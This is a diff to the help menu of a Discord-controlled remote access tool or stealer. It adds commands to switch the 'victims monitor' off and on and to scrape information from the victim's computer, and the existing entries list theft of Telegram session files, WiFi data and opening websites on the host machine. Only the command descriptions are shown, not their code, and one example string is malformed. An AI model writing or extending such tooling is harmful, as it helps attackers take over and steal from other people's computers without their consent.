@@ -394,7 +394,11 @@ async def help_command(ctx):
         {'name': 'website', 'description': 'Opens a Website on Hosts Computer.', 'example': '.website <your key> https://example.com'},
         {'name': 'exit', 'description': 'Exits Discord Bot.', 'example': '.exit <your key>'},
         {'name': 'wifi', 'description': 'All Info about Wlan.', 'example': '.wifi <your key>'},
-        {'name': 'telegram', 'description': 'Telegram Session Files.', 'example': '.telegram <your key>'}
+        {'name': 'telegram', 'description': 'Telegram Session Files.', 'example': '.telegram <your key>'},
+        {'name': 'turnoffmonitor', 'description': 'Turns off victims monitor', 'example': '.turnoffmonitor <your key>'},
+        {'name': 'turnonmonitor', 'description': 'Turns on victims monitor', 'example': '.turnonmonitor <your key>'},
+        {'name': 'pcscrape', 'description': 'Scrapes info on users computer', 'example': '.turnoffmonitor .pcscrape <your key>'}
+
     ]
 
 
